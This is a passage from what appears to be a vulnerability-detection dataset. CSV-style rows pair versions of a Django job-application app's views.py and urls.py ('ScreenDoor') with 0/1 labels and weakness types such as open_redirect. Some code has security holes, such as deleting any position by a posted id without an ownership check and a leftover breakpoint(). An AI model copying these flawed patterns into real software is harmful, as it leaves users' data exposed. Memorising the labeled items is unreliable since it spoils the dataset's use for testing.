    handler.on_modified = on_modified

    # global child_pids
    child_pids = []
    log.info(""starting %s workers"" % no_subprocess)

    def run_children():
        global child_pids
        child_pids = []
        for i in range(int(no_subprocess)):
            proc = subprocess.Popen([sys.executable, __file__],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            child_pids.append(proc.pid)
            log.info(""Started worker with pid %s"" % proc.pid)

    def kill_children():
        """"""
        kill subprocess on exit of manager (this) process
        """"""
        log.info(""Stopping worker(s)"")
        for pid in child_pids:
            if pid is not None:
                os.kill(pid, signal.SIGTERM)

    run_children()
    atexit.register(kill_children)
    signal.signal(signal.SIGTERM, kill_children)
    if watch_paths:
        observer = Observer()
        for path in watch_paths:
            if not is_background:
                print(""Watching for changes under %s"" % path)
            observer.schedule(handler, path=path, recursive=True)
        observer.start()
    while 1:
        try:
            sleep(1)
        except KeyboardInterrupt:
            log.info(""Keyboard interrupt, exiting"")
            if watch_paths:
                observer.stop()
                observer.join()
            sys.exit(0)


if __name__ == '__main__':
    if 'manage' in str(sys.argv):
        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]
        run_workers(no_subprocess)
    else:
        worker = Worker()
        worker.run()
/n/n/n",1,command_injection
0,144,fa57b716a2f936c6da66fdd5ba6c531303eba7e2,"screendoor/views.py/n/nfrom string import digits
from django.core.mail import send_mail
from django.shortcuts import render, redirect
from django.contrib.auth import get_user_model
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required

from .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText
from .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm
from .models import EmailAuthenticateToken, Position
from screendoor.parseposter import parse_upload
from screendoor.redactor import parse_applications


# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for
# the requested page, or raising an exception such as Http404.
# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL


# Index currently redirects to the positions view if logged in
@login_required(login_url='login/', redirect_field_name=None)
def index(request):
    return redirect('positions')
    # Returns main page
    return render(request, 'index.html',
                  {'user': request.user, 'baseVisibleText': InterfaceText})


# Renders account registration form
def register_form(request):
    register_form = ScreenDoorUserCreationForm()
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        register_form = ScreenDoorUserCreationForm(request.POST)
        # check whether form data is valid
        if register_form.is_valid():
            # Create user
            user = create_account(request)
            # Send confirmation e-mail
            send_user_email(request, user)
            # Redirects to...
            return render(request, 'registration/register.html',
                          {'register_form': register_form,
                           'account_created': format(CreateAccountFormText.account_created % user)})
    # Returns form page
    return render(request, 'registration/register.html',
                  {'register_form': register_form})


# Creates and returns user object from request data
def create_account(request):
    # Creates account and saves email, password, username to database
    user = get_user_model().objects.create_user(
        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())
    # Extrapolate first and last name from e-mail account (experimental)
    user.first_name = request.POST['email'].split('.')[0].title()
    user.last_name = request.POST['email'].split(
        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})
    # Set user as inactive until e-mail confirmation
    user.email_confirmed = False
    # Save updated user info to database
    user.save()
    return user


# Sends account confirmation e-mail to user
# Currently sends mock e-mail via console
def send_user_email(request, user):
    url = generate_confirmation_url(request, user)
    send_mail(
        'ScreenDoor: Please confirm e-mail address',
        'Please visit the following URL to confirm your account: ' + url,
        'screendoor@screendoor.ca',
        # Address: should be user.email
        [user.email],
        fail_silently=False,
    )


# Creates and returns a working account confirmation URL
def generate_confirmation_url(request, user):
    token = EmailAuthenticateToken()
    token.user = user
    token.create_key()
    token.save()
    # TODO: generate first part of URL programmatically not as hardcoded string
    return ""http://localhost:8000/confirm?key="" + str(token.key)


# Clears any GET data, i.e. account confirmation token string from URL
def clear_get_data(request):
    # Clears any GET data
    request.GET._mutable = True
    request.GET['key'] = None
    request.GET._mutable = False


# Returns true if user authentication token is valid and userhas been validated and saved
def authenticate_user(account_key):
    # If authentication key is valid, activate user and delete authentication token
    if EmailAuthenticateToken.objects.filter(key=account_key).exists():
        token = EmailAuthenticateToken.objects.get(key=account_key)
        user = token.user
        user.email_confirmed = True
        user.save()
        token.delete()
        return True
    return False


# Displays form for user login and calls validation methods
def login_form(request):
    # If user is not logged in, display login form
    if not request.user.is_authenticated:
        form = LoginForm()
        # Has the user hit login button
        if request.method == 'POST':
            clear_get_data(request)
            # Instantiate form object
            form = LoginForm(request.POST)
            # Validates form and persists username data
            if form.is_valid():
                user = form.get_user()
                # Logs in and redirects user
                login(request, user)
                return redirect('home')
        if request.GET.get('key') is not None:
            # Check if authentication key is valid
            if (authenticate_user(request.GET.get('key'))):
                # Display account confirmation message
                return render(request, 'registration/login.html',
                              {'login_form': form,
                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})
            # Display validation error message
            return render(request, 'registration/login.html',
                          {'login_form': form, 'validation_error': LoginFormText.validation_error})
        # Display login page
        return render(request, 'registration/login.html',
                      {'login_form': form})
    # If the user is already logged in, redirect to home
    return redirect('home')


# Logs out user
@login_required(login_url='/login/', redirect_field_name=None)
def logout_view(request):
    logout(request)
    return redirect('login')


# Run parse upload script and return dictionary
def parse_position_return_dictionary(create_position_form):
    # don't commit partial positions with only pdf/url into db
    return parse_upload(create_position_form.save(commit=False))


# Adds position to user data
def save_position_to_user(request):
    request.user.positions.add(Position.objects.get(
        id=request.session['position_id']))


# Displays form allowing users to upload job posting PDF files and URLs
@login_required(login_url='/login/', redirect_field_name=None)
def import_position(request):
    if request.method == 'POST':
        create_position_form = CreatePositionForm(
            request.POST, request.FILES)
        # Is the form data valid
        if create_position_form.is_valid():
            dictionary = parse_position_return_dictionary(create_position_form)
            errors = dictionary.get('errors')
            if errors:
                create_position_form.add_error('pdf', errors)
            # Is the parsed data valid (any errors added)
            if create_position_form.is_valid():
                position = dictionary.get('position')
                # Persist position ID in session for saving and editing
                request.session['position_id'] = position.id
                # Successful render of a position
                return render(request, 'createposition/importposition.html',
                              {'position': position, 'form': create_position_form,
                               'baseVisibleText': InterfaceText,
                               'userVisibleText': PositionText})
            # Display errors
            return render(request, 'createposition/importposition.html',
                          {'form': create_position_form,
                           'baseVisibleText': InterfaceText,
                           'userVisibleText': PositionText})
        # User pressed save button on uploaded and parsed position
        if request.POST.get(""save-position""):
            save_position_to_user(request)
            return redirect('home')
    # Default view for GET request
    create_position_form = CreatePositionForm()
    return render(request, 'createposition/importposition.html', {
        'form': CreatePositionForm, 'baseVisibleText': InterfaceText
    })


# Gets user's persisted positions sort method, or returns default
def get_positions_sort_method(request):
    try:
        return request.session['position_sort']
    except KeyError:
        return '-created'


# Changes positions sort method
def change_positions_sort_method(request, sort_by):
    if request.POST.get(""sort-created""):
        return '-created'
    elif request.POST.get(""sort-closed""):
        return '-date_closed'
    elif request.POST.get(""sort-position""):
        return 'position_title'
    return sort_by


# View of all positions associated with a user account
@login_required(login_url='/login/', redirect_field_name=None)
def positions(request):
    # Order of positions display
    sort_by = get_positions_sort_method(request)
    if request.method == 'POST':
        sort_by = change_positions_sort_method(request, sort_by)
        # User wants to view position detail
        if request.POST.get(""position""):
            return position(request, Position.objects.get(
                id=request.POST.get(""id"")))
        # User wants to delete position
        elif request.POST.get(""delete""):
            Position.objects.get(
                id=request.POST.get(""id"")).delete()
    # Persists positions sorting
    request.session['position_sort'] = sort_by
    # Displays list of positions
    return render(request, 'positions.html', {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']
    })


# Position detail view
@login_required(login_url='/login/', redirect_field_name=None)
def position(request, position):
    return render(request, 'position.html', {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position
    })


def import_applications(request):
    if request.method == 'POST':
        form = ImportApplicationsForm(request.POST, request.FILES)
        if form.is_valid():
            breakpoint()
            parse_applications()
            # Call application parser logic here##

            return render(request, 'importapplications/applications.html', {
                'form': form})

    form = ImportApplicationsForm()
    return render(request, 'importapplications/applications.html', {
        'form': form})
/n/n/n",0,open_redirect
1,145,fa57b716a2f936c6da66fdd5ba6c531303eba7e2,"/screendoor/views.py/n/nfrom string import digits
from django.http import HttpResponse
from django.core.mail import send_mail
from django.shortcuts import render, redirect
from django.contrib.auth import get_user_model
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required

from .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText
from django.utils.translation import gettext as _
from screendoor.redactor import parse_applications
from .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm
from .models import EmailAuthenticateToken, Position
from screendoor.parseposter import parse_upload


# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for
# the requested page, or raising an exception such as Http404.


# @login_required
# The login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL'

@login_required(login_url='login/', redirect_field_name=None)
def index(request):
    return redirect('positions')
    # Returns main page
    return render(request, 'index.html',
                  {'user': request.user, 'baseVisibleText': InterfaceText})


def register_form(request):
    register_form = ScreenDoorUserCreationForm()
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        register_form = ScreenDoorUserCreationForm(request.POST)
        # check whether form data is valid
        if register_form.is_valid():
            # Create user
            user = create_account(request)
            # Send confirmation e-mail
            send_user_email(request, user)
            # Redirects to...
            return render(request, 'registration/register.html',
                          {'register_form': register_form,
                           'account_created': format(CreateAccountFormText.account_created % user)})
            # Returns form page
    return render(request, 'registration/register.html',
                  {'register_form': register_form})


def create_account(request):
    # Creates account and saves email, password, username to database
    user = get_user_model().objects.create_user(
        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())
    # Extrapolate first and last name from e-mail account (experimental)
    user.first_name = request.POST['email'].split('.')[0].title()
    user.last_name = request.POST['email'].split(
        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})
    # Set user as inactive until e-mail confirmation
    user.email_confirmed = False
    # Save updated user info to database
    user.save()
    return user


def send_user_email(request, user):
    url = generate_confirmation_url(request, user)
    mail_sent = send_mail(
        'ScreenDoor: Please confirm e-mail address',
        'Please visit the following URL to confirm your account: ' + url,
        'screendoor@screendoor.ca',
        # Address: should be user.email
        [user.email],
        fail_silently=False,
    )


def generate_confirmation_url(request, user):
    token = EmailAuthenticateToken()
    token.user = user
    token.create_key()
    token.save()
    # TODO: generate first part of URL programmatically not as hardcoded string
    return ""http://localhost:8000/confirm?key="" + str(token.key)


def login_form(request):
    # If user is not logged in, display login form
    if not request.user.is_authenticated:
        form = LoginForm()
        # Has the user hit login button
        if request.method == 'POST':
            # Clears any GET data
            request.GET._mutable = True
            request.GET['key'] = None
            request.GET._mutable = False
            # Instantiate form object
            form = LoginForm(request.POST)
            # Validates form and persists username data
            if form.is_valid():
                user = form.get_user()
                login(request, user)
                return redirect('home')
        if request.GET.get('key') is not None:
            account_key = request.GET.get('key')
            # Is the token valid in the database
            if EmailAuthenticateToken.objects.filter(key=account_key).exists():
                token = EmailAuthenticateToken.objects.get(key=account_key)
                user = token.user
                user.email_confirmed = True
                user.save()
                token.delete()
                # Display account confirmation message
                return render(request, 'registration/login.html',
                              {'login_form': form,
                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})
            # Display validation error message
            return render(request, 'registration/login.html',
                          {'login_form': form, 'validation_error': LoginFormText.validation_error})
        # Display login page
        return render(request, 'registration/login.html',
                      {'login_form': form})
    # If the user is already logged in, redirect to home
    return redirect('home')


@login_required(login_url='/login/', redirect_field_name=None)
def logout_view(request):
    logout(request)
    return redirect('login')


@login_required(login_url='/login/', redirect_field_name=None)
def import_position(request):
    if request.method == 'POST':
        # if request.POST.get(""upload-position""):
        # valid form
        create_position_form = CreatePositionForm(
            request.POST, request.FILES)
        if create_position_form.is_valid():
            # don't commit partial positions with only pdf/url into db
            position = create_position_form.save(commit=False)
            d = parse_upload(position)
            errors = d.get('errors')
            if errors:
                create_position_form.add_error('pdf', errors)
            # second check
            if create_position_form.is_valid():
                position = d.get('position')
                # Persist position ID in session for saving and editing
                request.session['position_id'] = position.id
                # Successful render of a position
                return render(request, 'createposition/importposition.html',
                              {'position': position, 'form': create_position_form,
                               'baseVisibleText': InterfaceText,
                               'userVisibleText': PositionText})

            # Default view for a form with errors
            return render(request, 'createposition/importposition.html',
                          {'form': create_position_form,
                           'baseVisibleText': InterfaceText,
                           'userVisibleText': PositionText})
        if request.POST.get(""save-position""):
            position = Position.objects.get(id=request.session['position_id'])
            request.user.positions.add(position)
            return redirect('home')
    # view for a GET request instead of a POST request
    create_position_form = CreatePositionForm()
    return render(request, 'createposition/importposition.html', {
        'form': CreatePositionForm, 'baseVisibleText': InterfaceText
    })


@login_required(login_url='/login/', redirect_field_name=None)
def positions(request):
    try:
        sort_by = request.session['position_sort']
    except KeyError:
        sort_by = '-created'
    if request.method == 'POST':
        if request.POST.get(""sort-created""):
            sort_by = '-created'
        elif request.POST.get(""sort-closed""):
            sort_by = '-date_closed'
        elif request.POST.get(""sort-position""):
            sort_by = 'position_title'
        elif request.POST.get(""position""):
            return position(request, Position.objects.get(
                id=request.POST.get(""id"")))
        elif request.POST.get(""delete""):
            Position.objects.get(
                id=request.POST.get(""id"")).delete()

    request.session['position_sort'] = sort_by
    return render(request, 'positions.html', {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']
    })


@login_required(login_url='/login/', redirect_field_name=None)
def position(request, position):
    return render(request, 'position.html', {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position
    })


def import_applications(request):
    if request.method == 'POST':
        form = ImportApplicationsForm(request.POST, request.FILES)
        if form.is_valid():
            breakpoint()
            parse_applications()
            # Call application parser logic here##

            return render(request, 'importapplications/applications.html', {
                'form': form})

    form = ImportApplicationsForm()
    return render(request, 'importapplications/applications.html', {
        'form': form})
/n/n/n",1,open_redirect
2,148,36c8baffc532ac416c18e58e42421001bfcdb184,"screendoor/urls.py/n/nfrom django.urls import path, include

from . import views


# Set application namespace
# app_name = 'screendoor'

urlpatterns = [
    path('', views.index, name='home'),
    path('register/', views.register_form, name='register'),
    path('login/', views.login_form, name='login'),
    path('logout/', views.logout_view, name='logout'),
    path('confirm/', views.login_form, name='confirm_account'),
    path('createnewposition/', views.import_position, name='importposition'),
    path('positions/', views.positions, name='positions'),
    path('position/', views.position_detail, name='position'),
    path('importapplications/', views.import_applications,
         name='importapplications'),
]
/n/n/nscreendoor/views.py/n/nfrom string import digits
from django.core.mail import send_mail
from django.shortcuts import render, redirect
from django.contrib.auth import get_user_model
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required

from .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText
from .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm, ImportApplicationsText
from .models import EmailAuthenticateToken, Position, Applicant, Education, Classification
from screendoor.parseposter import parse_upload
from screendoor.redactor import parse_applications


# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for
# the requested page, or raising an exception such as Http404.
# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL


# Index currently redirects to the positions view if logged in
@login_required(login_url='login/', redirect_field_name=None)
def index(request):
    return redirect('positions')
    # Returns main page
    return render(request, 'index.html',
                  {'user': request.user, 'baseVisibleText': InterfaceText})


# Renders account registration form
def register_form(request):
    register_form = ScreenDoorUserCreationForm()
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        register_form = ScreenDoorUserCreationForm(request.POST)
        # check whether form data is valid
        if register_form.is_valid():
            # Create user
            user = create_account(request)
            # Send confirmation e-mail
            send_user_email(request, user)
            # Redirects to...
            return render(request, 'registration/register.html',
                          {'register_form': register_form,
                           'account_created': format(CreateAccountFormText.account_created % user)})
    # Returns form page
    return render(request, 'registration/register.html',
                  {'register_form': register_form})


# Creates and returns user object from request data
def create_account(request):
    # Creates account and saves email, password, username to database
    user = get_user_model().objects.create_user(
        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())
    # Extrapolate first and last name from e-mail account (experimental)
    user.first_name = request.POST['email'].split('.')[0].title()
    user.last_name = request.POST['email'].split(
        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})
    # Set user as inactive until e-mail confirmation
    user.email_confirmed = False
    # Save updated user info to database
    user.save()
    return user


# Sends account confirmation e-mail to user
# Currently sends mock e-mail via console
def send_user_email(request, user):
    url = generate_confirmation_url(request, user)
    send_mail(
        'ScreenDoor: Please confirm e-mail address',
        'Please visit the following URL to confirm your account: ' + url,
        'screendoor@screendoor.ca',
        # Address: should be user.email
        [user.email],
        fail_silently=False,
    )


# Creates and returns a working account confirmation URL
def generate_confirmation_url(request, user):
    token = EmailAuthenticateToken()
    token.user = user
    token.create_key()
    token.save()
    # TODO: generate first part of URL programmatically not as hardcoded string
    return ""http://localhost:8000/confirm?key="" + str(token.key)


# Clears any GET data, i.e. account confirmation token string from URL
def clear_get_data(request):
    # Clears any GET data
    request.GET._mutable = True
    request.GET['key'] = None
    request.GET._mutable = False


# Returns true if user authentication token is valid and userhas been validated and saved
def authenticate_user(account_key):
    # If authentication key is valid, activate user and delete authentication token
    if EmailAuthenticateToken.objects.filter(key=account_key).exists():
        token = EmailAuthenticateToken.objects.get(key=account_key)
        user = token.user
        user.email_confirmed = True
        user.save()
        token.delete()
        return user
    return None


# Displays form for user login and calls validation methods
def login_form(request):
    # If user is not logged in, display login form
    if not request.user.is_authenticated:
        form = LoginForm()
        # Has the user hit login button
        if request.method == 'POST':
            clear_get_data(request)
            # Instantiate form object
            form = LoginForm(request.POST)
            # Validates form and persists username data
            if form.is_valid():
                user = form.get_user()
                # Logs in and redirects user
                login(request, user)
                return redirect('home')
        if request.GET.get('key') is not None:
            # Check if authentication key is valid
            user = authenticate_user(request.GET.get('key'))
            if (user is not None):
                # Display account confirmation message
                return render(request, 'registration/login.html',
                              {'login_form': form,
                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})
            # Display validation error message
            return render(request, 'registration/login.html',
                          {'login_form': form, 'validation_error': LoginFormText.validation_error})
        # Display login page
        return render(request, 'registration/login.html',
                      {'login_form': form})
    # If the user is already logged in, redirect to home
    return redirect('home')


# Logs out user
@login_required(login_url='/login/', redirect_field_name=None)
def logout_view(request):
    logout(request)
    return redirect('login')


# Run parse upload script and return dictionary
def parse_position_return_dictionary(create_position_form):
    # don't commit partial positions with only pdf/url into db
    return parse_upload(create_position_form.save(commit=False))


# Adds position to user data
def save_position_to_user(request):
    request.user.positions.add(Position.objects.get(
        id=request.session['position_id']))


def edit_position(request):
    position = Position.objects.get(
        id=request.session['position_id'])
    position.position_title = request.POST.get(""position-title"")
    position.classification = request.POST.get(""position-classification"")
    position.reference_number = request.POST.get(""position-reference"")
    position.selection_process_number = request.POST.get(""position-selection"")
    position.date_closed = request.POST.get(""position-date_closed"")
    position.num_positions = request.POST.get(""position-num-positions"")
    position.salary_min = request.POST.get(
        ""position-salary-range"").split(""$"")[1].split(""-"")[0]
    position.salary_max = request.POST.get(
        ""position-salary-range"").split(""-"")[1].split(""$"")[1]
    position.open_to = request.POST.get(""position-open-to"")
    position.description = request.POST.get(""position-description"")
    counter = 1
    for requirement in position.requirement:
        requirement.description = request.POST.get(
            ""position-requirement"" + counter).split("":"")[1]
    return position


# Displays form allowing users to upload job posting PDF files and URLs
@login_required(login_url='/login/', redirect_field_name=None)
def import_position(request):
    if request.method == 'POST':
        create_position_form = CreatePositionForm(
            request.POST, request.FILES)
        # Is the form data valid
        if create_position_form.is_valid():
            dictionary = parse_position_return_dictionary(create_position_form)
            errors = dictionary.get('errors')
            if errors:
                create_position_form.add_error('pdf', errors)
            # Is the parsed data valid (any errors added)
            if create_position_form.is_valid():
                position = dictionary.get('position')
                # Persist position ID in session for saving and editing
                request.session['position_id'] = position.id
                # Successful render of a position
                return render(request, 'createposition/importposition.html',
                              {'position': position, 'form': create_position_form,
                               'baseVisibleText': InterfaceText,
                               'userVisibleText': PositionText})
            # Display errors
            return render(request, 'createposition/importposition.html',
                          {'form': create_position_form,
                           'baseVisibleText': InterfaceText,
                           'userVisibleText': PositionText})
        # User pressed save button on uploaded and parsed position
        if request.POST.get(""save-position""):
            edit_position(request)
            save_position_to_user(request)
            return redirect('home')
    # Default view for GET request
    create_position_form = CreatePositionForm()
    return render(request, 'createposition/importposition.html', {
        'form': CreatePositionForm, 'baseVisibleText': InterfaceText
    })


# Gets user's persisted positions sort method, or returns default
def get_positions_sort_method(request):
    try:
        return request.session['position_sort']
    except KeyError:
        return '-created'


# Changes positions sort method
def change_positions_sort_method(request, sort_by):
    if request.POST.get(""sort-created""):
        return '-created'
    elif request.POST.get(""sort-closed""):
        return '-date_closed'
    elif request.POST.get(""sort-position""):
        return 'position_title'
    return sort_by


# Data and visible text to render with positions list view
def positions_list_data(request, sort_by):
    return {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'applicationsForm': ImportApplicationsForm, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']
    }


# View of all positions associated with a user account
@login_required(login_url='/login/', redirect_field_name=None)
def positions(request):
    # Order of positions display
    sort_by = get_positions_sort_method(request)
    if request.method == 'POST':
        sort_by = change_positions_sort_method(request, sort_by)
        # User wants to view position detail
        if request.POST.get(""position""):
            return position_detail(request, Position.objects.get(
                id=request.POST.get(""id"")))
        # User wants to delete position
        elif request.POST.get(""delete""):
            Position.objects.get(
                id=request.POST.get(""id"")).delete()
        # User wants to upload applications for a position
        elif request.POST.get(""upload-applications""):
            upload_applications(request)
            return position_detail(request, Position.objects.get(
                id=request.POST.get(""id"")))
    # Persists positions sorting
    request.session['position_sort'] = sort_by
    # Displays list of positions
    return render(request, 'positions.html', positions_list_data(request, sort_by))


# Data and visible text to render with positions
def position_detail_data(request, position):
    return {'baseVisibleText': InterfaceText, 'applicationsForm': ImportApplicationsForm, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position, 'applications': position.applications}


# Position detail view
@login_required(login_url='/login/', redirect_field_name=None)
def position_detail(request, position):
    return render(request, 'position.html', position_detail_data(request, position))


def upload_applications(request):
    position = Position.objects.get(
        id=request.POST.get(""id""))
    # form = ImportApplicationsForm(request.POST, request.FILES)
    # applications = import_applications(request)
    # position.applications.add(applications)
    # position.save()


def import_applications(request):
    if request.method == 'POST':
        form = ImportApplicationsForm(request.POST, request.FILES)
        if form.is_valid():
            breakpoint()
            parse_applications()
            # Call application parser logic here##

            return render(request, 'importapplications/applications.html', {
                'form': form})

    form = ImportApplicationsForm()
    return render(request, 'importapplications/applications.html', {
        'form': form})
/n/n/n",0,open_redirect
3,149,36c8baffc532ac416c18e58e42421001bfcdb184,"/screendoor/urls.py/n/nfrom django.urls import path, include

from . import views


# Set application namespace
# app_name = 'screendoor'

urlpatterns = [
    path('', views.index, name='home'),
    path('register/', views.register_form, name='register'),
    path('login/', views.login_form, name='login'),
    path('logout/', views.logout_view, name='logout'),
    path('confirm/', views.login_form, name='confirm_account'),
    path('createnewposition/', views.import_position, name='importposition'),
    path('positions/', views.positions, name='positions'),
    path('position/', views.position, name='position'),
    path('importapplications/', views.import_applications,
         name='importapplications'),
]
/n/n/n/screendoor/views.py/n/nfrom string import digits
from django.core.mail import send_mail
from django.shortcuts import render, redirect
from django.contrib.auth import get_user_model
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required

from .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText
from .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm, ImportApplicationsText
from .models import EmailAuthenticateToken, Position
from screendoor.parseposter import parse_upload
from screendoor.redactor import parse_applications


# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for
# the requested page, or raising an exception such as Http404.
# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL


# Index currently redirects to the positions view if logged in
@login_required(login_url='login/', redirect_field_name=None)
def index(request):
    return redirect('positions')
    # Returns main page
    return render(request, 'index.html',
                  {'user': request.user, 'baseVisibleText': InterfaceText})


# Renders account registration form
def register_form(request):
    register_form = ScreenDoorUserCreationForm()
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        register_form = ScreenDoorUserCreationForm(request.POST)
        # check whether form data is valid
        if register_form.is_valid():
            # Create user
            user = create_account(request)
            # Send confirmation e-mail
            send_user_email(request, user)
            # Redirects to...
            return render(request, 'registration/register.html',
                          {'register_form': register_form,
                           'account_created': format(CreateAccountFormText.account_created % user)})
    # Returns form page
    return render(request, 'registration/register.html',
                  {'register_form': register_form})


# Creates and returns user object from request data
def create_account(request):
    # Creates account and saves email, password, username to database
    user = get_user_model().objects.create_user(
        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())
    # Extrapolate first and last name from e-mail account (experimental)
    user.first_name = request.POST['email'].split('.')[0].title()
    user.last_name = request.POST['email'].split(
        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})
    # Set user as inactive until e-mail confirmation
    user.email_confirmed = False
    # Save updated user info to database
    user.save()
    return user


# Sends account confirmation e-mail to user
# Currently sends mock e-mail via console
def send_user_email(request, user):
    url = generate_confirmation_url(request, user)
    send_mail(
        'ScreenDoor: Please confirm e-mail address',
        'Please visit the following URL to confirm your account: ' + url,
        'screendoor@screendoor.ca',
        # Address: should be user.email
        [user.email],
        fail_silently=False,
    )


# Creates and returns a working account confirmation URL
def generate_confirmation_url(request, user):
    token = EmailAuthenticateToken()
    token.user = user
    token.create_key()
    token.save()
    # TODO: generate first part of URL programmatically not as hardcoded string
    return ""http://localhost:8000/confirm?key="" + str(token.key)


# Clears any GET data, i.e. account confirmation token string from URL
def clear_get_data(request):
    # Clears any GET data
    request.GET._mutable = True
    request.GET['key'] = None
    request.GET._mutable = False


# Returns true if user authentication token is valid and userhas been validated and saved
def authenticate_user(account_key):
    # If authentication key is valid, activate user and delete authentication token
    if EmailAuthenticateToken.objects.filter(key=account_key).exists():
        token = EmailAuthenticateToken.objects.get(key=account_key)
        user = token.user
        user.email_confirmed = True
        user.save()
        token.delete()
        return True
    return False


# Displays form for user login and calls validation methods
def login_form(request):
    # If user is not logged in, display login form
    if not request.user.is_authenticated:
        form = LoginForm()
        # Has the user hit login button
        if request.method == 'POST':
            clear_get_data(request)
            # Instantiate form object
            form = LoginForm(request.POST)
            # Validates form and persists username data
            if form.is_valid():
                user = form.get_user()
                # Logs in and redirects user
                login(request, user)
                return redirect('home')
        if request.GET.get('key') is not None:
            # Check if authentication key is valid
            if (authenticate_user(request.GET.get('key'))):
                # Display account confirmation message
                return render(request, 'registration/login.html',
                              {'login_form': form,
                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})
            # Display validation error message
            return render(request, 'registration/login.html',
                          {'login_form': form, 'validation_error': LoginFormText.validation_error})
        # Display login page
        return render(request, 'registration/login.html',
                      {'login_form': form})
    # If the user is already logged in, redirect to home
    return redirect('home')


# Logs out user
@login_required(login_url='/login/', redirect_field_name=None)
def logout_view(request):
    logout(request)
    return redirect('login')


# Run parse upload script and return dictionary
def parse_position_return_dictionary(create_position_form):
    # don't commit partial positions with only pdf/url into db
    return parse_upload(create_position_form.save(commit=False))


# Adds position to user data
def save_position_to_user(request):
    request.user.positions.add(Position.objects.get(
        id=request.session['position_id']))


# Displays form allowing users to upload job posting PDF files and URLs
@login_required(login_url='/login/', redirect_field_name=None)
def import_position(request):
    if request.method == 'POST':
        create_position_form = CreatePositionForm(
            request.POST, request.FILES)
        # Is the form data valid
        if create_position_form.is_valid():
            dictionary = parse_position_return_dictionary(create_position_form)
            errors = dictionary.get('errors')
            if errors:
                create_position_form.add_error('pdf', errors)
            # Is the parsed data valid (any errors added)
            if create_position_form.is_valid():
                position = dictionary.get('position')
                # Persist position ID in session for saving and editing
                request.session['position_id'] = position.id
                # Successful render of a position
                return render(request, 'createposition/importposition.html',
                              {'position': position, 'form': create_position_form,
                               'baseVisibleText': InterfaceText,
                               'userVisibleText': PositionText})
            # Display errors
            return render(request, 'createposition/importposition.html',
                          {'form': create_position_form,
                           'baseVisibleText': InterfaceText,
                           'userVisibleText': PositionText})
        # User pressed save button on uploaded and parsed position
        if request.POST.get(""save-position""):
            save_position_to_user(request)
            return redirect('home')
    # Default view for GET request
    create_position_form = CreatePositionForm()
    return render(request, 'createposition/importposition.html', {
        'form': CreatePositionForm, 'baseVisibleText': InterfaceText
    })


# Gets user's persisted positions sort method, or returns default
def get_positions_sort_method(request):
    try:
        return request.session['position_sort']
    except KeyError:
        return '-created'


# Changes positions sort method
def change_positions_sort_method(request, sort_by):
    if request.POST.get(""sort-created""):
        return '-created'
    elif request.POST.get(""sort-closed""):
        return '-date_closed'
    elif request.POST.get(""sort-position""):
        return 'position_title'
    return sort_by


# Data and visible text to render with positions list view
def positions_list_data(request, sort_by):
    return {
        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'applicationsForm': ImportApplicationsForm, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']
    }
  
  
# View of all positions associated with a user account
@login_required(login_url='/login/', redirect_field_name=None)
def positions(request):
    # Order of positions display
    sort_by = get_positions_sort_method(request)
    if request.method == 'POST':
        sort_by = change_positions_sort_method(request, sort_by)
        # User wants to view position detail
        if request.POST.get(""position""):
            return position(request, Position.objects.get(
                id=request.POST.get(""id"")))
        # User wants to delete position
        elif request.POST.get(""delete""):
            Position.objects.get(
                id=request.POST.get(""id"")).delete()
